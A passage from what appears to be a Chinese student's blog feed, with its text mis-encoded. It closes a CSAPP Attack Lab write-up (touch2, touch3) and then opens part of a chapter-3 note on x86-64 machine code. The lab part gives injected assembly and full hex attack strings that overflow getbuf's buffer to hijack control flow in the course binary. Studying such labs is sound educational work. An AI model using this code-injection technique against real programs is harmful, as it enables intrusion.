00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;<br>  401802:75 20                jne    401824 &lt;touch2+0x38&gt;<br>  401804:be e8 30 40 00       mov    $0x4030e8,%esi<br>  401809:bf 01 00 00 00       mov    $0x1,%edi<br>  40180e:b8 00 00 00 00       mov    $0x0,%eax<br>  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;<br>  401818:bf 02 00 00 00       mov    $0x2,%edi<br>  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;<br>  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;<br>  401824:be 10 31 40 00       mov    $0x403110,%esi<br>  401829:bf 01 00 00 00       mov    $0x1,%edi<br>  40182e:b8 00 00 00 00       mov    $0x0,%eax<br>  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;<br>  401838:bf 02 00 00 00       mov    $0x2,%edi<br>  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;<br>  401842:bf 00 00 00 00       mov    $0x0,%edi<br>  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><blockquote><p>æˆ‘çœŸçš„çœ‹æ±‡ç¼–å¤´æ™•æˆ‘ä¸¢ç»™ ida äº†</p></blockquote><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch2.png"></p><p>æ£€æŸ¥æ¡ä»¶æ˜¯ <code>val = cookie</code> ï¼Œcookie æ¯æ¬¡éƒ½æ˜¯ä¸€æ ·çš„ <code>0x59b997fa</code>ã€‚æˆ‘ä»¬è¦æŠŠè¿™ä¸ªå€¼ä¼ ç»™ valï¼Œå¯ä»¥ç”¨å‘½ä»¤ <code>movq 0x59b997fa,%rdi</code> å®ç°ã€‚</p><blockquote><p>ç¬¬ä¸€ä¸ªå‚æ•°ç”¨ rdi ä¼ é€’</p></blockquote><p>å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ getbuf æ—¶å¡«å…¥è¯¥è¯­å¥ï¼Œå†å°†è¿”å›åœ°å€æ”¹å†™æˆ touch2 çš„åœ°å€ï¼Œè¿™æ ·ä¸€æ¥å†æ¬¡è·³è½¬æ‰§è¡Œ <code>ret</code> ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq 0x59b997fa,%rdi<br>pushq 0x04017ec<br>retq<br></code></pre></td></tr></table></figure><p>æœ€åè·å¾—çš„å­—èŠ‚åºåˆ—æ˜¯ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch2%E7%BB%93%E6%9E%9C.png"></p><h3 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h3><blockquote><p>ä»»åŠ¡æè¿°ï¼šå½“å‡½æ•° getbuf è¿”å›åï¼Œè®© ctarget æ‰§è¡Œå‡½æ•° touch3 ï¼Œè€Œä¸æ˜¯ç»§ç»­æ‰§è¡Œå‡½æ•° test ã€‚</p></blockquote><p>åŒæ ·è¿˜æ˜¯ä» test è·³è½¬åˆ° <code>touch3</code>ï¼Œè¿™æ¬¡æ˜¯è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•° <code>hexmatch()</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch3.png"></p><p> <code>hexmatch()</code> å¿…é¡»ä¸º true æ‰èƒ½æˆåŠŸ</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-hexmatch.png"></p><p>å°±æ˜¯è¦å¯¹æ¯” sval å’Œ è½¬åŒ–æˆå­—ç¬¦ä¸²åçš„ cookie ï¼Œè®©å®ƒä»¬ä¿©ç›¸ç­‰ã€‚å¯ä»¥ä½¿ç”¨ <code>man ascii</code> å‘½ä»¤ï¼Œå¾—åˆ°å­—ç¬¦ä¸²59b997fa çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">59b997fa</span> =&gt; <span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p>åœ¨Cè¯­è¨€ä¸­å­—ç¬¦ä¸²éœ€è¦åœ¨æœ«å°¾è¡¥ä¸Šç»“æŸç¬¦<code>&#39;\0&#39;</code>ï¼Œå…¶å¯¹åº”çš„åå…­è¿›åˆ¶å½¢å¼ä¸º<code>0x00</code>ã€‚å› æ­¤ï¼Œå­—ç¬¦ä¸²çš„å®Œæ•´è¡¨ç¤ºä¸ºï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>ç”±äºæ­¤å¤„ v2 ä¸ºæŒ‡é’ˆæŒ‡å‘æŸå¤„åœ°å€ï¼Œæˆ‘ä»¬è¦å°† rdi åœ°å€è®¾ç½®ä¸ºå­—ç¬¦ä¸²çš„åœ°å€ã€‚æ­¤æ—¶æˆ‘ä»¬éœ€è¦è€ƒè™‘æŠŠå­—ç¬¦ä¸²å­˜å‚¨åœ¨å“ªé‡Œï¼Œç”±äºå‡½æ•° hexmatch å’Œ strncmp è¢«è°ƒç”¨æ—¶ï¼Œgetbuf ä½¿ç”¨çš„ç¼“å†²åŒºä¼šè¢«é‡å†™ã€‚å› æ­¤ï¼Œä¸èƒ½å°†å­—ç¬¦ä¸²å­˜æ”¾åœ¨getbuf çš„ç¼“å†²åŒºä¸­ã€‚å¯ä»¥æŠŠå…¶å­˜æ”¾åœ¨ test çš„æ ˆå¸§ä¸­ã€‚</p><p>getbufçš„æ ˆé¡¶åœ°å€ä¸º<code>0x5561dc78</code>ï¼Œgetbuf çš„ç¼“å†²åŒºåœ¨æ ˆä¸­å äº†40ä¸ªå­—èŠ‚ï¼Œéšåå…¶è¿”å›åœ°å€åˆå äº†8ä¸ªå­—èŠ‚ï¼Œå…±è®¡48&#x3D;0x30ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x5561dc78</span> + <span class="hljs-number">0</span>x30 = <span class="hljs-number">0</span>x5561dca8<br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå¯ä»¥å°† cookie å€¼å­˜æ”¾åœ¨åœ°å€ <code>0x5561dca8</code> ä¸­ã€‚</p><p>æ³¨å…¥çš„æ±‡ç¼–ä»£ç å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov $0x5561dca8, %rdi<br>push $0x4018fa        <br>ret                  <br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„æ”»å‡»å­—ç¬¦ä¸²ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch3%E7%BB%93%E6%9E%9C.png"></p><hr><p>åŸæ¥è¿™ä¸ªå®éªŒæˆ‘åšäº†ä¸‰å¤©ğŸ˜¶â€ğŸŒ«ï¸æœç„¶å‡æœŸå°±æ˜¯æ‡’æƒ°</p><p>xsbb:</p><p>åœ¨ phase_3 çš„è·³è½¬è¡¨é‚£é‡Œï¼Œå…¶å®æˆ‘å½“æ—¶æ ¹æœ¬æ²¡çœ‹å‡ºæ¥è¿™æ˜¯è·³è½¬è¡¨ï¼Œæˆ‘å»é—®äº† chatCPTğŸ˜¿</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_chat.png"></p><hr><p>ç¼–è¾‘è®°å½•ï¼š</p><ul><li><p>2023-10-03 bomblab</p></li><li><p>2023-11-20 attacklab</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPPlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬ä¸‰ç«  ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º æ€»ç»“</title>
    <link href="/2023/09/30/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
    <url>/2023/09/30/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<p>Cè¯­è¨€æŒ‡ä»¤å¯¹åº”çš„æœºå™¨è¡¨ç¤º</p><span id="more"></span><h3 id="å†å²è§‚ç‚¹"><a href="#å†å²è§‚ç‚¹" class="headerlink" title="å†å²è§‚ç‚¹"></a>å†å²è§‚ç‚¹</h3><p>Inter å¤„ç†å™¨ç³»åˆ—ä¿—ç§° x86ï¼Œå®ƒç»å†äº†ä¸€ä¸ªé•¿æœŸçš„ã€ä¸æ–­è¿›åŒ–çš„è¿‡ç¨‹ã€‚å‡ åå¹´æ¥ï¼Œå®ç°äº†ä» 16 ä½åˆ° 32 ä½ i386ï¼Œæœ€ååˆ°ç°åœ¨ 64 ä½çš„ x86-64 å¤„ç†å™¨ï¼Œå…¶ä¸­æ¯ä¸ªåç»§å¤„ç†å™¨éƒ½æ˜¯å‘åå…¼å®¹çš„â€”â€”è¾ƒæ—©ç‰ˆæœ¬çš„å¤„ç†å™¨ä¸Šç¼–è¯‘çš„ä»£ç æ€»æ˜¯å¯ä»¥åœ¨è¾ƒæ–°çš„å¤„ç†å™¨ä¸Šè¿è¡Œã€‚</p><h5 id="æ‘©å°”å®šå¾‹"><a href="#æ‘©å°”å®šå¾‹" class="headerlink" title="æ‘©å°”å®šå¾‹"></a>æ‘©å°”å®šå¾‹</h5><p>1965å¹´ï¼ŒGordon Mone ï¼ˆIntel å…¬å¸çš„åˆ›å§‹äººï¼‰æ¨æ–­ï¼Œåœ¨æœªæ¥çš„åå¹´ï¼ŒèŠ¯ç‰‡ä¸Šçš„æ™¶ä½“ç®¡æ•°é‡æ¯å¹´éƒ½ä¼šç¿»ä¸€ç•ªï¼Œè¿™ä¸ªé¢„æµ‹å°±æ˜¯æ‘©å°”å®šå¾‹ã€‚äº‹å®è¯æ˜è¿™ä¸ªé¢„æµ‹æ˜¯æ­£ç¡®çš„ã€‚</p><blockquote><p>è¿˜ä»¥ä¸ºæ˜¯æ‘©å°”åº„å›­é‚£ä¸ªæ‘©å°”ï¼ˆx</p></blockquote><h3 id="ç¨‹åºç¼–ç "><a href="#ç¨‹åºç¼–ç " class="headerlink" title="ç¨‹åºç¼–ç "></a>ç¨‹åºç¼–ç </h3><p>å‡è®¾Cç¨‹åº Hello.c æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨ linux ç³»ç»Ÿä¸­ç”¨ä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘ä»£ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gcc -g Hello.c -o Hello</span><br></code></pre></td></tr></table></figure><blockquote><p>gccï¼ˆGCCï¼‰æ˜¯ Linux çš„é»˜è®¤ç¼–è¯‘å™¨</p></blockquote><p>ç”¨æˆ·çœ‹æ¥æ˜¯æ‰§è¡Œäº†ä¸€æ¡å‘½ä»¤ï¼Œä½†æ˜¯å®é™…ä¸Šæœºå™¨æ‰§è¡Œäº†ä¸€ç³»åˆ—çš„ç¨‹åºï¼Œæ‰å°†æºä»£ç è½¬æ¢æˆå¯æ‰§è¡Œä»£ç ã€‚æœ‰ä»¥ä¸‹å‡ ä¸ªæµç¨‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¸åŒçš„å‘½ä»¤æ§åˆ¶ GCC é€æ­¥æ‰§è¡Œï¼š</p><ul><li><p>é¢„å¤„ç†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -E Hello.c -o Hello.i</span><br></code></pre></td></tr></table></figure><p>Cé¢„å¤„ç†å™¨æ‹“å±•æºä»£ç ï¼Œæ’å…¥æ‰€æœ‰ #include å‘½ä»¤æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¹¶æ‹“å±•æ‰€æœ‰ä»¥ #define å£°æ˜æŒ‡å®šçš„å®ã€‚</p></li><li><p>ç¼–è¯‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -S Hello.i -o Hello.s</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨ä¼šäº§ç”Ÿæ±‡ç¼–ä»£ç æ–‡ä»¶ <code>Hello.s</code>ã€‚</p></li><li><p>æ±‡ç¼–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -c test.s -o test.o</span><br></code></pre></td></tr></table></figure><p>æ±‡ç¼–å™¨ä¼šå°†æ±‡ç¼–ä»£ç è½¬åŒ–æˆäºŒè¿›åˆ¶ç›®æ ‡ä»£ç æ–‡ä»¶ <code>Hello.o</code> ã€‚å…¶ä¸­ï¼Œç›®æ ‡ä»£ç æ˜¯æ±‡ç¼–ä»£ç çš„ä¸€ç§å½¢å¼ï¼Œå®ƒåŒ…å«æ‰€æœ‰æŒ‡ä»¤çš„äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œä½†æ˜¯æ²¡æœ‰å¡«å…¥å…¨å±€å€¼çš„åœ°å€ã€‚</p></li><li><p>é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -g test.o -o <span class="hljs-built_in">test</span> [--static]</span><br></code></pre></td></tr></table></figure><p>è¿æ¥å™¨å°†ç›®æ ‡ä»£ç æ–‡ä»¶ä¸å®ç°åº“å‡½æ•°ï¼ˆä¾‹å¦‚ printf ï¼‰çš„ä»£ç åˆå¹¶ï¼Œå¹¶äº§ç”Ÿæœ€ç»ˆçš„å¯æ‰§è¡Œä»£ç æ–‡ä»¶ã€‚å…¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é˜Ÿåä¸€æ­¥ç¼–è¯‘çš„æ—¶å€™æ·»åŠ  <code>static</code> å‚æ•°è¿›è¡Œé™æ€é“¾æ¥ï¼Œä¸å‚åŠ å‚æ•°å°±æ˜¯é»˜è®¤åŠ¨æ€é“¾æ¥ã€‚</p></li></ul><p>å¯¹äºæœºå™¨çº§ç¼–ç¨‹æ¥è¯´ï¼Œæœ‰ä¸¤ç§æŠ½è±¡å°¤ä¸ºé‡è¦ï¼š</p><ul><li>ç”±æŒ‡ä»¤é›†ä½“ç³»ç»“æ„æˆ–æŒ‡ä»¤é›†æ¶æ„ï¼ˆISAï¼‰å®šä¹‰çš„æœºå™¨åŠç¨‹åºçš„æ ¼å¼å’Œè¡Œä¸ºã€‚</li><li>å†…å­˜åœ°å€å®é™…ä¸Šæ˜¯è™šæ‹Ÿåœ°å€</li></ul><p>åœ¨Cè¯­è¨€ä¸­ï¼Œæˆ‘ä»¬å£°æ˜å’Œåˆ†é…å„ç§æ•°æ®ç±»å‹çš„å¯¹è±¡ï¼Œä½†æ˜¯æœºå™¨ä»£ç ä¸åŒºåˆ†è¿™äº›æ•°æ®ï¼Œåªæ˜¯å°†å†…å­˜çœ‹ä½œä¸€ä¸ªå¾ˆå¤§çš„ã€æŒ‰å­—èŠ‚å¯»å€çš„æ•°ç»„ã€‚ä¸åŒºåˆ†å„ç§ç±»å‹çš„æ•°æ®ï¼Œæ•°ç»„å’Œç»“æ„ä¹Ÿåªä½¿ç”¨ä¸€ç»„è¿ç»­çš„å­—èŠ‚æ¥è¡¨ç¤ºã€‚</p><p>X86-64 çš„æœºå™¨ä»£ç å’ŒåŸå§‹çš„Cè¯­è¨€ä»£ç å·®åˆ«å¾ˆå¤§ï¼Œå¯¹äºç¨‹åºå‘˜æ¥è¯´æ˜¯æœ‰å¾ˆå¤šçš„éšè—çŠ¶æ€ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ç¨‹åºè®¡æ•°å™¨ï¼ˆé€šå¸¸ç§°ä¸º PC ï¼Œåœ¨ x86-64 ä¸­ç”¨ <code>%rip</code> è¡¨ç¤ºï¼‰ç”¨äºæŒ‡ç¤ºç¨‹åºè¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„åœ°å€</li><li>æ•´æ•°å¯„å­˜å™¨æ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨åœ°å€ï¼ˆå¯¹åº”Cè¯­è¨€çš„æŒ‡é’ˆï¼‰æˆ–æ•´æ•°æ•°æ®ã€‚</li><li>æ¡ä»¶ç å¯„å­˜å™¨ï¼Œä¿å­˜ç€æœ€è¿‘æ‰§è¡Œçš„ç®—æœ¯é€»è¾‘æˆ–é€»è¾‘æŒ‡ä»¤çš„çŠ¶æ€ä¿¡æ¯</li><li>å‘é‡å¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸€ä¸ªæˆ–å¤šä¸ªæ•´æ•°æˆ–æµ®ç‚¹æ•°å€¼</li></ul><blockquote><p>æˆ‘ä»¬ç»å¸¸æ¥è§¦åˆ°çš„æ±‡ç¼–è¯­è¨€ï¼Œå…¶å®å¹¶ä¸æ˜¯æœºå™¨è¯­è¨€ã€‚ä½†æ˜¯æ±‡ç¼–ä»£ç è¡¨ç¤ºéå¸¸æ¥è¿‘æœºå™¨ä»£ç ï¼Œç”±äºæ±‡ç¼–ä»£ç å¯¹äºç¨‹åºå‘˜æ¥è®²æ›´å…·æœ‰å¯è¯»æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»å¸¸ç”¨æ±‡ç¼–ä»£ç æ¥å­¦ä¹ å’Œè§£é‡Šæœºå™¨ä»£ç è¡Œä¸º</p></blockquote><p>ç¨‹åºå†…å­˜è¿™äº›éƒ½æ˜¯ç”±è™šæ‹Ÿå†…å­˜æ¥å¯»å€çš„ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£ç®¡ç†è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼ŒæŠŠ<strong>è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºå®é™…ç‰©ç†åœ°å€</strong>ã€‚</p><p>å‰é¢æœ‰æåˆ°ï¼Œç¨‹åºçš„æ±‡ç¼–æŒ‡ä»¤è½¬åŒ–ä¸ºè®¡ç®—æœºå¯è¯»çš„æ–‡ä»¶äºŒè¿›åˆ¶ç›®æ ‡ä»£ç åå°±å˜æˆäº†ä¸€ä¸ª01çš„å­—èŠ‚åºåˆ—ï¼Œæœºå™¨ä¹Ÿåªæ˜¯æ‰§è¡Œè¿™ä¸ªå­—èŠ‚åºåˆ—ï¼Œæœºå™¨å¯¹æŒ‡ä»¤çš„æºä»£ç ä¸€æ— æ‰€çŸ¥ã€‚</p><p>å½“ç„¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„å‘½ä»¤åç¼–è¯‘å¯é‡å®šå‘æ–‡ä»¶æˆ–è€…æ˜¯å¯æ‰§è¡Œ ELF æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d filename.o</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d filename</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>hexdump -x  filename.o</code> å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶çš„åå…­è¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼ˆè™½ç„¶æ²¡æœ‰ä»€ä¹ˆå¯è¯»æ€§ä¸Šçš„å¸®åŠ© <del>xsbb</del>ï¼‰</p><blockquote><p>objdump ã€hexdump å‘½ä»¤è¿˜æœ‰ä¸åŒå‚æ•°å¯¹åº”ä¸åŒåŠŸèƒ½ </p></blockquote><p>æœºå™¨ä»£ç çš„ç‰¹æ€§ï¼š</p><ul><li><p>æŒ‡ä»¤å¯ä»¥ä»ä»»æ„å†…å­˜åœ°å€å¼€å§‹ï¼ŒCPUä¸ä¼šå¼ºåˆ¶è¿›è¡Œä»£ç å¯¹é½</p></li><li><p>æŒ‡ä»¤é•¿åº¦ä»1å­—èŠ‚åˆ°15å­—èŠ‚ä¸ç­‰ã€‚å¸¸ç”¨æŒ‡ä»¤çš„å­—èŠ‚æ•°å°‘ï¼Œè¶Šä¸å¸¸ç”¨å­—èŠ‚æ•°è¶Šå¤š</p></li><li><p>ä»ç»™å®šçš„æŸä¸€ä½ç½®å¼€å§‹ï¼Œæ¯ä¸€ä¸ªæœºå™¨å­—èŠ‚éƒ½å¯¹åº”å”¯ä¸€çš„æŒ‡ä»¤</p></li><li><p>åæ±‡ç¼–å™¨åªæ˜¯æ ¹æ®å­—èŠ‚åºåˆ—ç¡®å®šæ±‡ç¼–ä»£ç ï¼Œå®ƒä¸éœ€è¦è®¿é—®ç¼–è¯‘å‡ºè¯¥ç¨‹åºçš„æºæ–‡ä»¶</p></li></ul><p>å¦‚æœæˆ‘ä»¬ç›´æ¥ <code>cat filename.s</code>ï¼Œè¾“å‡ºçš„æ±‡ç¼–ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E6%9F%A5%E7%9C%8B%E6%B1%87%E7%BC%96%E6%96%87%E4%BB%B6.png"></p><p>å…¶ä¸­ä»¥ <code>.</code> å¼€å¤´çš„éƒ½æ˜¯çŸ¥é“æ±‡ç¼–å™¨å’Œç¼–è¯‘å™¨çš„ä¼ªæŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å¿½ç•¥ã€‚æˆ‘ä»¬åœ¨è¡¨ç¤ºæ±‡ç¼–ä»£ç æ—¶ä¼šçœç•¥è¿™äº›ä¼ªæŒ‡ä»¤ï¼ŒåŒæ—¶ï¼Œæ±‡ç¼–ä»£ç çš„æ ¼å¼ä¹Ÿæœ‰ä¸åŒï¼Œåˆ†ä¸º AT&amp;T å’Œ Inter ä¸¤ç§é£æ ¼ï¼š</p><blockquote><p>gcc é»˜è®¤è¾“å‡ºçš„æ˜¯ AT&amp;T ï¼Œå¾®è½¯ç³»åˆ—éƒ½æ˜¯ Inter</p></blockquote><table><thead><tr><th></th><th>Inter</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>æŒ‡ä»¤åç¼€</td><td>æ— åç¼€ï¼Œä¾‹å¦‚ï¼šmovã€push</td><td>æœ‰æŒ‡ç¤ºå¤§å°çš„åç¼€ï¼Œä¾‹å¦‚ï¼špushqã€movq</td></tr><tr><td>å¯„å­˜å™¨</td><td>å¯„å­˜å™¨æ—  % ç¬¦å·ï¼Œä¾‹å¦‚ï¼šrbx</td><td>å¯„å­˜å™¨æœ‰ % ç¬¦å·ï¼Œä¾‹å¦‚ï¼š%rbx</td></tr><tr><td>ç«‹å³æ•°</td><td>æœ‰ä»»ä½•å‰ç¼€ï¼Œç›´æ¥ç”¨ä¸€ä¸ªæ•°å­—è¡¨ç¤º</td><td>ç”¨ $ å‰ç¼€è¡¨ç¤ºä¸€ä¸ªç«‹å³æ•°</td></tr><tr><td>æ“ä½œæ•°é¡ºåº</td><td>æ“ä½œç¬¦ ç›®çš„æ“ä½œæ•° , æºæ“ä½œæ•° ä¾‹å¦‚ï¼šmov eax,1</td><td>æ“ä½œç¬¦ æºæ“ä½œæ•° , ç›®çš„æ“ä½œæ•°  ä¾‹å¦‚ï¼šmov $1,%eax</td></tr><tr><td>å†…å­˜å–å€</td><td>section:[base + index*scale + disp]</td><td>section:disp(base, index, scale)</td></tr></tbody></table><blockquote><p>å…¶ä¸­baseå’Œindexå¿…é¡»æ˜¯å¯„å­˜å™¨ï¼Œdispå’Œscaleå¯ä»¥æ˜¯å¸¸æ•°</p><p>è®¡ç®—æ–¹æ³• :  disp + base + index * scale</p><p>æœ€ç»ˆåœ°å€ &#x3D; åœ°å€æˆ–åç§» + %åŸºå€æˆ–åç§»é‡å¯„å­˜å™¨ + %ç´¢å¼•å¯„å­˜å™¨ * æ¯”ä¾‹å› å­</p></blockquote><h3 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h3><p>ç”±äº Intel æ˜¯ä» 6 ä½ä½“ç³»æ‹“å±•æˆ 64 ä½çš„ï¼Œæ‰€ä»¥ç”¨æœ¯è¯­ â€œå­—(word)â€ è¡¨ç¤º 16 ä½çš„æ•°æ®ç±»å‹ï¼Œå› æ­¤ 32 ä½æ•°è¢«ç§°ä¸º â€œåŒå­—(double words)â€ï¼ŒåŒç† 64 ä½æ•°è¢«ç§°ä¸º â€œå››å­—(quad words)â€ã€‚</p><p>æŒ‡é’ˆåœ¨ä¸åŒä½æ•°ç³»ç»Ÿä¸­çš„å¤§å°ä¸åŒï¼Œåœ¨å¤šå°‘çš„ç³»ç»Ÿé‡Œé¢å°±æ˜¯å¤šå°‘ï¼Œ64ä½ç³»ç»Ÿä¸­å°±å¯¹åº”å­˜å‚¨ä¸º 8 å­—èŠ‚çš„å››å­—ã€‚</p><p>ä¸‹é¢æ˜¯å¸¸è§çš„æ•°æ®ç±»å‹çš„å¤§å°ï¼š</p><table><thead><tr><th align="center">Cå£°æ˜</th><th align="center">Intelæ•°æ®ç±»å‹</th><th align="center">æ±‡ç¼–ä»£ç åç¼€</th><th align="center">å¤§å°ï¼ˆå­—èŠ‚ï¼‰</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">å­—èŠ‚</td><td align="center">b</td><td align="center">1</td></tr><tr><td align="center">short</td><td align="center">å­—</td><td align="center">w</td><td align="center">2</td></tr><tr><td align="center">int</td><td align="center">åŒå­—</td><td align="center">l</td><td align="center">4</td></tr><tr><td align="center">long</td><td align="center">å››å­—</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">char *</td><td align="center">å››å­—</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">float</td><td align="center">å•ç²¾åº¦</td><td align="center">s</td><td align="center">4</td></tr><tr><td align="center">double</td><td align="center">åŒç²¾åº¦</td><td align="center">l</td><td align="center">8</td></tr></tbody></table><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶4å­—èŠ‚çš„æ•´æ•°å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°éƒ½æ˜¯ç”¨ l æ¥è¡¨ç¤ºï¼Œä½†æ˜¯ä¸ä¼šäº§ç”Ÿæ­§ä¹‰ï¼Œå› ä¸ºä¸¤ç§æ•°æ®ç±»å‹ä½¿ç”¨çš„æ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ç»„æŒ‡ä»¤å’Œå¯„å­˜å™¨ã€‚</p><h3 id="è®¿é—®ä¿¡æ¯"><a href="#è®¿é—®ä¿¡æ¯" class="headerlink" 